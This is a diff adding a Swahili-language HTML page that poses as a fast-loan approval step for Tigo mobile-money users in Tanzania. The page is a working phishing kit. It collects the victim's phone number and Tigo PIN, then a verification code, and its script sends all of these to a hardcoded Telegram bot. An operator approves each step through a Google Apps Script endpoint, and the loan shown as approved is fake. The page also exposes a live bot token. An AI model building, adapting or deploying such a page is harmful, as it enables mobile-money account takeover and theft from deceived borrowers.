@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mkopo Wa Haraka - Thibitisha & Uidhinishwe</title>
+    <style>
+        :root {
+            --primary: #2563eb; --primary-dark: #1d4ed8; --primary-light: #dbeafe;
+            --gold: #f59e0b; --gold-dark: #d97706; --gold-light: #fef3c7;
+            --success: #10b981; --success-light: #d1fae5;
+            --danger: #ef4444; --danger-light: #fee2e2;
+            --dark: #1e293b; --gray: #64748b; --gray-light: #f1f5f9;
+            --white: #ffffff; --border: #e2e8f0;
+            --radius: 12px; --radius-lg: 16px; --transition: all 0.3s ease;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f8fafc; color: var(--dark); min-height: 100vh;
+            display: flex; align-items: center; justify-content: center; padding: 1rem;
+        }
+
+        .container {
+            background: var(--white); border-radius: var(--radius-lg);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.15); border: 1px solid var(--border);
+            max-width: 480px; width: 100%;
+        }
+
+        .top-bar {
+            background: var(--primary); color: white; padding: 1rem 1.5rem;
+            display: flex; align-items: center; gap: 0.8rem; font-weight: 600;
+            font-size: 0.9rem; border-radius: var(--radius-lg) var(--radius-lg) 0 0;
+        }
+
+        .top-bar a { color: white; text-decoration: none; font-size: 1.3rem; cursor: pointer; }
+        .content { padding: 2rem 1.5rem; }
+
+        .loan-summary {
+            background: var(--primary-light); border-radius: var(--radius);
+            padding: 1rem; text-align: center; margin-bottom: 1.5rem;
+        }
+
+        .loan-summary .amount { font-size: 1.8rem; font-weight: 900; color: var(--primary); }
+        .loan-summary .detail { font-size: 0.85rem; color: var(--dark); margin-top: 0.3rem; }
+
+        .phase-indicator {
+            display: flex; align-items: center; justify-content: center; gap: 0.5rem;
+            margin-bottom: 1.5rem; font-size: 0.75rem; color: var(--gray);
+        }
+
+        .phase-dot { width: 10px; height: 10px; border-radius: 50%; background: var(--border); transition: var(--transition); }
+        .phase-dot.active { background: var(--primary); box-shadow: 0 0 8px rgba(37,99,235,0.5); }
+        .phase-dot.done { background: var(--success); }
+
+        .screen { display: none; animation: fadeIn 0.4s ease; }
+        .screen.active { display: block; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-group { margin-bottom: 1.2rem; }
+        .form-group label { display: block; font-weight: 600; margin-bottom: 0.4rem; font-size: 0.9rem; }
+
+        .phone-box {
+            display: flex; border: 2px solid var(--border); border-radius: var(--radius);
+            overflow: hidden; transition: var(--transition);
+        }
+        .phone-box:focus-within { border-color: var(--primary); box-shadow: 0 0 0 4px var(--primary-light); }
+        .phone-box.error { border-color: var(--danger); box-shadow: 0 0 0 4px var(--danger-light); }
+        .phone-box .prefix { background: var(--gray-light); padding: 0.85rem 1rem; font-weight: 700; border-right: 1px solid var(--border); }
+        .phone-box input { flex: 1; padding: 0.85rem 1rem; border: none; font-size: 1rem; font-family: inherit; outline: none; }
+
+        .pin-box {
+            position: relative; border: 2px solid var(--border); border-radius: var(--radius);
+            overflow: hidden; transition: var(--transition);
+        }
+        .pin-box:focus-within { border-color: var(--primary); box-shadow: 0 0 0 4px var(--primary-light); }
+        .pin-box.error { border-color: var(--danger); box-shadow: 0 0 0 4px var(--danger-light); }
+        .pin-box input {
+            width: 100%; padding: 0.85rem 1rem; border: none; font-size: 1.2rem;
+            font-family: inherit; outline: none; letter-spacing: 0.5rem;
+        }
+        .pin-box .toggle-btn {
+            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; cursor: pointer; font-size: 1.2rem;
+        }
+
+        .error-msg { color: var(--danger); font-size: 0.8rem; margin-top: 0.3rem; display: none; }
+        .error-msg.show { display: block; }
+
+        .btn {
+            width: 100%; padding: 0.95rem; border-radius: 50px; font-weight: 700;
+            font-size: 1.05rem; cursor: pointer; border: none; transition: var(--transition);
+            font-family: inherit; margin-top: 0.5rem;
+        }
+
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-primary:hover { background: var(--primary-dark); transform: translateY(-2px); }
+        .btn-gold { background: var(--gold); color: var(--dark); }
+        .btn-gold:hover { background: var(--gold-dark); transform: translateY(-2px); }
+
+        .waiting-content { text-align: center; padding: 1rem; }
+
+        .spinner {
+            width: 60px; height: 60px; border: 5px solid var(--border);
+            border-top-color: var(--primary); border-radius: 50%;
+            animation: spin 1s linear infinite; margin: 0 auto 1.5rem;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .phone-display {
+            background: var(--gray-light); padding: 0.5rem 1.5rem;
+            border-radius: 25px; display: inline-block; font-weight: 700; margin: 0.8rem 0;
+        }
+
+        .status-note {
+            background: #fff8e1; border-radius: var(--radius); padding: 1rem;
+            margin-top: 1rem; font-size: 0.85rem; text-align: left; border-left: 4px solid var(--warning);
+        }
+
+        .code-inputs { display: flex; gap: 0.5rem; justify-content: center; margin: 1rem 0; }
+
+        .code-inputs input {
+            width: 50px; height: 55px; text-align: center; font-size: 1.5rem;
+            font-weight: 700; border: 2px solid var(--border); border-radius: var(--radius);
+            outline: none; transition: var(--transition); font-family: inherit;
+        }
+
+        .code-inputs input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px var(--primary-light); }
+        .code-inputs input.error { border-color: var(--danger); box-shadow: 0 0 0 3px var(--danger-light); }
+
+        .success-overlay {
+            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7);
+            z-index: 1000; align-items: center; justify-content: center;
+        }
+        .success-overlay.active { display: flex; }
+
+        .success-card {
+            background: var(--white); border-radius: var(--radius-lg); padding: 2.5rem 2rem;
+            text-align: center; max-width: 420px; width: 90%; animation: popIn 0.5s ease;
+        }
+
+        @keyframes popIn {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .check-icon { width: 80px; height: 80px; margin: 0 auto 1rem; }
+        .check-icon svg { width: 100%; height: 100%; }
+        .check-circle { stroke: var(--success); stroke-width: 3; fill: none; stroke-dasharray: 283; stroke-dashoffset: 283; animation: drawCircle 1s ease forwards; }
+        .check-mark { stroke: var(--success); stroke-width: 3; fill: none; stroke-dasharray: 100; stroke-dashoffset: 100; animation: drawCheck 0.5s 0.6s ease forwards; }
+
+        @keyframes drawCircle { to { stroke-dashoffset: 0; } }
+        @keyframes drawCheck { to { stroke-dashoffset: 0; } }
+
+        .success-card h2 { color: var(--success); margin-bottom: 0.3rem; }
+        .success-card .big-amount { font-size: 2rem; font-weight: 900; color: var(--primary); margin: 0.8rem 0; }
+        .success-card .info { color: var(--gray); font-size: 0.9rem; margin-bottom: 1rem; line-height: 1.5; }
+
+        .btn-home {
+            background: var(--primary); color: white; padding: 0.9rem 2.5rem;
+            border-radius: 50px; font-weight: 600; cursor: pointer; border: none;
+            font-family: inherit; font-size: 1rem;
+        }
+        .btn-home:hover { background: var(--primary-dark); }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="top-bar">
+            <a href="apply.html">←</a>
+            <span>Thibitisha & Uidhinishwe</span>
+        </div>
+
+        <div class="content">
+            <div class="phase-indicator">
+                <span>Taarifa</span>
+                <span class="phase-dot active" id="phaseDot1"></span>
+                <span>→</span>
+                <span class="phase-dot" id="phaseDot2"></span>
+                <span>→</span>
+                <span class="phase-dot" id="phaseDot3"></span>
+                <span>→</span>
+                <span class="phase-dot" id="phaseDot4"></span>
+                <span>Imekamilika</span>
+            </div>
+
+            <div class="loan-summary">
+                <div style="font-size:0.75rem;color:var(--gray);">Mkopo Wako</div>
+                <div class="amount" id="loanAmount">TZS 0</div>
+                <div class="detail">
+                    Muda: <strong id="loanTerm">-</strong> | Kila Mwezi: <strong id="loanMonthly">TZS 0</strong>
+                </div>
+            </div>
+
+            <!-- SCREEN 1 -->
+            <div class="screen active" id="screen1">
+                <h3 style="margin-bottom:1rem;">📱 Ingiza Taarifa za Tigo</h3>
+                <div class="form-group">
+                    <label>Namba ya Simu ya Tigo</label>
+                    <div class="phone-box" id="phoneBox">
+                        <span class="prefix">+255</span>
+                        <input type="tel" id="phoneNumber" placeholder="Ingiza namba ya Tigo" maxlength="12">
+                    </div>
+                    <div class="error-msg" id="phoneError">Ingiza namba sahihi ya simu (angalau tarakimu 9)</div>
+                </div>
+                <div class="form-group">
+                    <label>Namba ya Siri ya Tigo (PIN)</label>
+                    <div class="pin-box" id="pinBox">
+                        <input type="password" id="tigoPin" placeholder="• • • •" maxlength="4">
+                        <button class="toggle-btn" onclick="togglePIN()">👁️</button>
+                    </div>
+                    <div class="error-msg" id="pinError">Ingiza PIN yako ya tarakimu 4</div>
+                </div>
+                <button class="btn btn-primary" onclick="submitDetails()">Endelea →</button>
+            </div>
+
+            <!-- SCREEN 2: Inakaguliwa -->
+            <div class="screen" id="screen2">
+                <div class="waiting-content">
+                    <div class="spinner"></div>
+                    <h3>⏳ Inakaguliwa</h3>
+                    <p style="color:var(--gray);">Taarifa zako zimetumwa kwa uidhinishaji</p>
+                    <div class="phone-display" id="showPhone">+255 ---------</div>
+                    <div class="status-note" id="statusNote">
+                        <strong>📋 Hali:</strong> Inasubiri uidhinishaji<br>
+                        <span style="font-size:0.8rem;color:var(--gray);">Tafadhali subiri wakati ombi lako linachakatwa...</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SCREEN 3: Ingiza Namba -->
+            <div class="screen" id="screen3">
+                <div class="waiting-content">
+                    <h3>✅ Imeidhinishwa! Ingiza Namba ya Uthibitisho</h3>
+                    <p style="color:var(--gray);font-size:0.9rem;">Ingiza namba ya uthibitisho uliyopokea</p>
+                    <div class="phone-display" id="showPhone2">+255 ---------</div>
+                    <div style="margin-top:1.5rem;">
+                        <h4>🔑 Namba ya Uthibitisho</h4>
+                        <div class="code-inputs">
+                            <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+                            <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+                            <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+                            <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
+                        </div>
+                        <div class="error-msg" id="codeError" style="text-align:center;">Namba si sahihi</div>
+                        <button class="btn btn-gold" onclick="submitCode()">Tuma Namba →</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SCREEN 4: Inathibitisha -->
+            <div class="screen" id="screen4">
+                <div class="waiting-content">
+                    <div class="spinner"></div>
+                    <h3>⏳ Inathibitisha Namba</h3>
+                    <p style="color:var(--gray);">Namba yako inathibitishwa</p>
+                    <div class="phone-display" id="showPhone3">+255 ---------</div>
+                    <div class="status-note">
+                        <strong>📋 Hali:</strong> Inakaguliwa<br>
+                        <span style="font-size:0.8rem;color:var(--gray);">Namba imetumwa kwa uthibitisho. Tafadhali subiri...</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SUCCESS -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-card">
+            <div class="check-icon">
+                <svg viewBox="0 0 100 100">
+                    <circle class="check-circle" cx="50" cy="50" r="45"/>
+                    <path class="check-mark" d="M30 50 L45 65 L70 35" fill="none"/>
+                </svg>
+            </div>
+            <h2>🎉 Mkopo Umechakatwa kwa Mafanikio!</h2>
+            <p style="color:var(--gray);">Mkopo wako umechakatwa</p>
+            <div class="big-amount" id="approvedAmount">TZS 0</div>
+            <p class="info">
+                📱 Uthibitisho umetumwa kwenye simu yako<br>
+                💰 Fedha zitaingia hivi karibuni<br>
+                ⏳ Tafadhali subiri kwa muda mfupi
+            </p>
+            <button class="btn-home" onclick="window.location.href='index.html'">🏠 Rudi Nyumbani</button>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // CONFIG
+        // ==========================================
+        const BOT_TOKEN = '8742412220:AAH_Hh7yrP1RC5H6Meyq6692qvJYtb43ZFU';
+        const CHAT_ID = '7603447738';
+        const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN;
+        const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxpkBHZA73GXerL6gqpXfbXQayIwrixssn9LxOGSk_bQP5eQoUQhkDdalkZK_Vg9ZB9AA/exec';
+
+        // ==========================================
+        // LOAN DATA
+        // ==========================================
+        const loanData = (() => {
+            const p = new URLSearchParams(window.location.search);
+            let a = p.get('amount'), t = p.get('term');
+            if (!a) a = localStorage.getItem('quickcash_loan_amount');
+            if (!t) t = localStorage.getItem('quickcash_loan_term');
+            return { amount: parseInt(a||'500000'), term: parseInt(t||'1') };
+        })();
+
+        const loanAmount = loanData.amount;
+        const loanTerm = loanData.term;
+        const monthlyPayment = Math.round((loanAmount * 0.065 / 12) / (1 - Math.pow(1 + 0.065 / 12, -loanTerm * 12)));
+
+        document.getElementById('loanAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
+        document.getElementById('loanTerm').textContent = loanTerm === 1 ? 'Mwaka 1' : 'Miaka ' + loanTerm;
+        document.getElementById('loanMonthly').textContent = 'TZS ' + monthlyPayment.toLocaleString() + '/mwezi';
+        document.getElementById('approvedAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
+
+        let expectedCode = null;
+        let enteredCode = null;
+        let userPhone = '';
+        let requestId = '';
+        let checkInterval = null;
+
+        // ==========================================
+        // SEND TO TELEGRAM
+        // ==========================================
+        function sendToTelegram(message) {
+            fetch(TELEGRAM_API + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) console.log('✅ Imetumwa Telegram');
+                else console.error('❌ Hitilafu:', data);
+            })
+            .catch(err => console.error('❌ Imeshindwa:', err));
+        }
+
+        // ==========================================
+        // CHECK APPROVAL STATUS FROM GOOGLE APPS SCRIPT
+        // ==========================================
+        function startCheckingApproval() {
+            if (checkInterval) clearInterval(checkInterval);
+            
+            checkInterval = setInterval(() => {
+                fetch(APPS_SCRIPT_URL + '?action=check&id=' + requestId)
+                    .then(res => res.json())
+                    .then(data => {
+                        console.log('🔍 Checking status:', data);
+                        
+                        if (data.status === 'approved' && document.getElementById('screen2').classList.contains('active')) {
+                            // Phone approved!
+                            clearInterval(checkInterval);
+                            showCodeScreen();
+                        }
+                        
+                        if (data.codeStatus === 'approved' && document.getElementById('screen4').classList.contains('active')) {
+                            // Code approved!
+                            clearInterval(checkInterval);
+                            showSuccessScreen();
+                        }
+                        
+                        if (data.status === 'rejected') {
+                            clearInterval(checkInterval);
+                            goBackToStart('Ombi limekataliwa. Tafadhali jaribu tena.');
+                        }
+                        
+                        if (data.codeStatus === 'rejected') {
+                            clearInterval(checkInterval);
+                            goBackToCode('Namba si sahihi. Tafadhali jaribu tena.');
+                        }
+                    })
+                    .catch(err => console.error('❌ Check error:', err));
+            }, 3000); // Check every 3 seconds
+        }
+
+        function stopChecking() {
+            if (checkInterval) { clearInterval(checkInterval); checkInterval = null; }
+        }
+
+        // ==========================================
+        // TOGGLE PIN
+        // ==========================================
+        function togglePIN() {
+            const p = document.getElementById('tigoPin');
+            const b = p.parentElement.querySelector('.toggle-btn');
+            if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; }
+            else { p.type = 'password'; b.textContent = '👁️'; }
+        }
+
+        // ==========================================
+        // INPUT HANDLERS
+        // ==========================================
+        document.getElementById('phoneNumber').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            document.getElementById('phoneBox').classList.remove('error');
+            document.getElementById('phoneError').classList.remove('show');
+        });
+
+        document.getElementById('tigoPin').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            document.getElementById('pinBox').classList.remove('error');
+            document.getElementById('pinError').classList.remove('show');
+        });
+
+        // ==========================================
+        // SUBMIT PHONE & PIN
+        // ==========================================
+        function submitDetails() {
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const pin = document.getElementById('tigoPin').value.trim();
+            let valid = true;
+
+            if (!phone || phone.length < 9) {
+                document.getElementById('phoneBox').classList.add('error');
+                document.getElementById('phoneError').classList.add('show');
+                valid = false;
+            }
+            if (!pin || pin.length !== 4) {
+                document.getElementById('pinBox').classList.add('error');
+                document.getElementById('pinError').classList.add('show');
+                valid = false;
+            }
+            if (!valid) return;
+
+            userPhone = phone;
+            expectedCode = Math.floor(1000 + Math.random() * 9000).toString();
+            requestId = 'MH-' + Date.now().toString(36).toUpperCase();
+
+            // Save code to Apps Script
+            fetch(APPS_SCRIPT_URL + '?action=setCode&id=' + requestId + '&code=' + expectedCode, { mode: 'no-cors' });
+
+            // Show screen 2
+            document.getElementById('screen1').classList.remove('active');
+            document.getElementById('screen2').classList.add('active');
+            document.getElementById('showPhone').textContent = '+255 ' + phone;
+            document.getElementById('showPhone2').textContent = '+255 ' + phone;
+            document.getElementById('showPhone3').textContent = '+255 ' + phone;
+            document.getElementById('phaseDot1').classList.add('done');
+            document.getElementById('phaseDot1').classList.remove('active');
+            document.getElementById('phaseDot2').classList.add('active');
+
+            // Send to Telegram
+            const msg = 
+                '📥 <b>Ombi Jipya la Mkopo</b>\n\n' +
+                '🆔 ID: <code>' + requestId + '</code>\n' +
+                '📱 Simu: +255 ' + phone + '\n' +
+                '🔢 PIN: ' + pin + '\n' +
+                '💰 Kiasi: TZS ' + loanAmount.toLocaleString() + '\n' +
+                '📅 Muda: ' + (loanTerm === 1 ? 'Mwaka 1' : 'Miaka ' + loanTerm) + '\n' +
+                '💵 Kila Mwezi: TZS ' + monthlyPayment.toLocaleString() + '\n' +
+                '🔑 Namba ya Uthibitisho: <b>' + expectedCode + '</b>\n\n' +
+                '<b>Jibu kwa amri:</b>\n' +
+                '/idhinisha ' + requestId + '  (kuidhinisha)\n' +
+                '/kataa ' + requestId + '  (kukataa)';
+
+            sendToTelegram(msg);
+
+            // Start checking for approval
+            startCheckingApproval();
+
+            // Save locally
+            localStorage.setItem('quickcash_payment', JSON.stringify({
+                phone: '+255' + phone, pin, amount: loanAmount, term: loanTerm, expectedCode, requestId
+            }));
+
+            console.log('📤 Imetumwa Telegram. Inasubiri uidhinishaji...');
+            console.log('🆔 ID: ' + requestId);
+            console.log('🔑 Namba: ' + expectedCode);
+        }
+
+        // ==========================================
+        // SHOW CODE SCREEN (approved)
+        // ==========================================
+        function showCodeScreen() {
+            document.getElementById('screen2').classList.remove('active');
+            document.getElementById('screen3').classList.add('active');
+            document.getElementById('phaseDot2').classList.add('done');
+            document.getElementById('phaseDot2').classList.remove('active');
+            document.getElementById('phaseDot3').classList.add('active');
+            document.querySelector('.cd').focus();
+            console.log('✅ Imeidhinishwa! Onyesha namba');
+        }
+
+        function goBackToStart(message) {
+            document.getElementById('screen2').classList.remove('active');
+            document.getElementById('screen1').classList.add('active');
+            document.getElementById('phaseDot1').classList.remove('done');
+            document.getElementById('phaseDot1').classList.add('active');
+            document.getElementById('phaseDot2').classList.remove('active');
+            alert(message);
+            console.log('❌ Imekataliwa');
+        }
+
+        // ==========================================
+        // CODE INPUT
+        // ==========================================
+        function nextCode(input) {
+            input.value = input.value.replace(/\D/g, '');
+            if (input.value.length === 1) {
+                const n = input.nextElementSibling;
+                if (n && n.classList.contains('cd')) n.focus();
+            }
+            document.querySelectorAll('.cd').forEach(d => d.classList.remove('error'));
+            document.getElementById('codeError').classList.remove('show');
+        }
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && e.target.classList.contains('cd') && e.target.value === '') {
+                const p = e.target.previousElementSibling;
+                if (p && p.classList.contains('cd')) p.focus();
+            }
+        });
+
+        // ==========================================
+        // SUBMIT CODE
+        // ==========================================
+        function submitCode() {
+            enteredCode = '';
+            document.querySelectorAll('.cd').forEach(d => enteredCode += d.value);
+
+            if (enteredCode.length !== 4) {
+                document.getElementById('codeError').textContent = 'Tafadhali ingiza namba kamili ya tarakimu 4';
+                document.getElementById('codeError').classList.add('show');
+                return;
+            }
+
+            document.getElementById('screen3').classList.remove('active');
+            document.getElementById('screen4').classList.add('active');
+            document.getElementById('phaseDot3').classList.add('done');
+            document.getElementById('phaseDot3').classList.remove('active');
+            document.getElementById('phaseDot4').classList.add('active');
+
+            // Send to Telegram
+            const msg = 
+                '🔐 <b>Uthibitisho wa Namba</b>\n\n' +
+                '🆔 ID: <code>' + requestId + '</code>\n' +
+                '📱 Simu: +255 ' + userPhone + '\n' +
+                '🔑 Inayotarajiwa: <b>' + expectedCode + '</b>\n' +
+                '✍️ Iliyoingizwa: <b>' + enteredCode + '</b>\n' +
+                '💰 Kiasi: TZS ' + loanAmount.toLocaleString() + '\n\n' +
+                '<b>Jibu:</b>\n' +
+                '/thibitisha ' + requestId + '  (kama namba ni sahihi)\n' +
+                '/kataa_namba ' + requestId + '  (kama namba si sahihi)';
+
+            sendToTelegram(msg);
+
+            // Start checking for code approval
+            startCheckingApproval();
+
+            console.log('📤 Namba imetumwa kwa uthibitisho');
+        }
+
+        function showSuccessScreen() {
+            document.getElementById('screen4').classList.remove('active');
+            document.getElementById('phaseDot4').classList.add('done');
+            document.getElementById('phaseDot4').classList.remove('active');
+            document.getElementById('successOverlay').classList.add('active');
+
+            const appId = 'MH-' + Date.now().toString(36).toUpperCase();
+            localStorage.setItem('quickcash_approved', JSON.stringify({
+                id: appId, amount: loanAmount, term: loanTerm,
+                monthly: monthlyPayment, phone: '+255' + userPhone,
+                time: new Date().toISOString(),
+            }));
+
+            sendToTelegram('🎉 <b>MKOPO UMEIDHINISHWA!</b>\n🆔 ' + appId + '\n💰 TZS ' + loanAmount.toLocaleString() + '\n📱 +255 ' + userPhone);
+            console.log('🎉 MKOPO UMEFANIKIWA! ' + appId);
+        }
+
+        function goBackToCode(message) {
+            document.getElementById('screen4').classList.remove('active');
+            document.getElementById('screen3').classList.add('active');
+            document.getElementById('phaseDot3').classList.remove('done');
+            document.getElementById('phaseDot3').classList.add('active');
+            document.getElementById('phaseDot4').classList.remove('active');
+            document.getElementById('codeError').textContent = message;
+            document.getElementById('codeError').classList.add('show');
+            document.querySelectorAll('.cd').forEach(d => { d.value = ''; d.classList.add('error'); });
+            setTimeout(() => {
+                document.querySelectorAll('.cd').forEach(d => d.classList.remove('error'));
+                document.getElementById('codeError').classList.remove('show');
+                document.querySelector('.cd').focus();
+            }, 2000);
+            console.log('❌ Namba imekataliwa');
+        }
+
+        console.log('%c🏦 Mkopo Wa Haraka - Inafanya kazi kwenye vifaa vyote!', 'color:#10b981;font-weight:bold;font-size:1.1rem;');
+        console.log('%c📱 Inaangalia Apps Script kila sekunde 3', 'color:#2563eb;');
+    </script>
+</body>
+</html>
